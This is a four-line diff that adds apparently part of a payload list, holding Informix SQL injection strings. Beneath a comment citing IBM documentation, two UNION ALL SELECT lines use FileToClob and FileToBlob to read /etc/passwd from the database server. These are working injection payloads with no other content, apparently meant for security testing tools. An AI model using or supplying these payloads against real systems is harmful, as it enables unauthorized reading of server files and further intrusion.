@@ -1,0 +1,4 @@
+# various things for http://www-01.ibm.com/support/knowledgecenter/SSGU8G_11.50.0/com.ibm.sqls.doc/ids_sqs_1526.htm
+#
+UNION ALL SELECT FileToClob("/etc/passwd", "server")::html,0
+UNION ALL SELECT FileToBlob("/etc/passwd", "server")::html,0
